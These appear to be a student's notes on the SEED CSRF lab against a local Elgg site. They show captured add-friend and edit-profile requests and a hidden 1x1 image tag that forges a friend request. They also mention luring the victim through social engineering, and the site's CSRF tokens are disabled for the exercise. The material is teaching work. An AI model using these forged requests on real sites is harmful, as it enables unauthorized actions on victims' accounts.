# Cross Site Request Forgery Lab

## Setup

Target Website: `www.seed-server.com`

Attacker: `www.attacker32.com`

Add the following to `/etc/hosts/`:

```Text
10.9.0.5    www.seed-server.com
10.9.0.105  www.attacker32.com
```

Navigate to CSRF Lab directory

- `dcbuild`
- `dcup`
- `dcdown`

## Attack on GET

**Goal**: Add yourself to the victim’s friend list without his/her consent. Get Alice to add Samy as a friend without her knowing.

### Investigation taken

- Creates an Elgg account using Charlie as the name.
  - Username: `Charlie`
  - Password: `seedcharlie`
  - Password Rule: `seed` + username
- In Charlie's account, he clicks add-friend button to add himself to Charlie's friend list.
- Using Firefox HTTP Headers live extension, he captures the `add-friend HTTP request`.

On Charlie's account:

- Navigate to Samy's profile and send Add Friend Request
- Use HTTP Header Live to capture the communication

### Captured Header

```Text
http://www.seed-server.com/action/friends/add?friend=59 (1)
&__elgg_ts=1667091629&__elgg_token=KTR8UDIBcXwD8GyOa3B1Vg&__ (2)
elgg_ts=1667091629&__elgg_token=KTR8UDIBcXwD8GyOa3B1Vg
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0)
Gecko/20100101 Firefox/83.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://www.seed-server.com/profile/samy (3)
Cookie: Elgg=gh7f5e1strhg89dplma2sikaal
```

1. URL of Elgg’s add-friend request. UserID of the user to be added to the friend list is used. Here, Samy’s UserID (GUID) is 59.
2. Elgg’s countermeasure against CSRF attacks which are disabled.
3. Session cookie which is unique for each user. It is automatically sent by browser.

### Crafting the Malicious HTTP GET request

```HTML
<html>
    <body>
        <h1>This Page forges an HTTP GET request.</h1>

        <img src="http://www.csrflabelgg.com/action/friends/add?friend=42" alt="image" width="1" height="1" />
    </body>
</html>
```

1. The img tag will trigger an HTTP GET request. When browsers render a web page and sees an img tag, it sends an HTTP GET request to the URL specified in the src attribute.
2. The attacker use add-friend URL along with friend parameter. The size of the image is very small so that the victim is not suspicious.
3. You need to design your attack as part of your Lab 3. Go to the attacker folder inside the CSRFLab folder and edit the `addfriend.html` file accordingly what you learned in the line of the previous slide and the crafted line above. You can target Alice. You also need to find Alice GUID.

### Attract Victim to Visit Your Malicious Page

- Samy can use any social engineering technique to lure to Alice visit its malicious web page.
- If Alice clicks the link, Samy’s malicious web page will be loaded into Alice’s browser and a forged add-friend request will be sent to the Elgg server.
- On success, Samy will be added to Alice’s friend list.

## Attack on POST

**Goal**: Putting a statement “SAMY is MY HERO” in the victim’s profile without the consent from the victim.

### Investigation by the attacker Samy

- Samy captured an edit-profile request using LiveHTTPHeader extension.

### Attack on Elgg's Edit

To update the profile, a POST request is sent with the form details displayed. Strategy moving forward is to emulate the POST sent from the form.

### POST Capture

```Text
http://www.seed-server.com/action/profile/edit (1)
Host: www.seed-server.com (2)
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------24529425883703756564101934818
Content-Length: 3030
Origin: http://www.seed-server.com
Connection: keep-alive
Referer: http://www.seed-server.com/profile/charlie/edit
Cookie: Elgg=cm5rnpl0a04v16rib0d5vsuf0v
Upgrade-Insecure-Requests: 1
__elgg_token=qRvwchxgs48dAnJEAp3NiA&__elgg_ts=1667153814 (3)
&name=Charlie (4)
&description=<p>Testing the About me field</p>
&accesslevel[description]=2 (5)
&briefdescription=Testing Brief Descriton field
&accesslevel[briefdescription]=2 (5)
[Other fields that are not of interest]
&guid=58 (6)
```

1. URL of the edit-profile service.
2. Headers
3. CSRF countermeasures, which are disabled
4. Fields of Interest (NAME=VALUE)
5. Access level of each field : 2 means viewable by everyone
6. User Id (GUID) of the victim. This can be obtained by visiting victim’s profile page source, looking for the following: `Elgg.page_owner={“guid”:39,”type”:”user”,...}` Or by sending an `ADD-FRIEND` request and capturing the GUID in the request
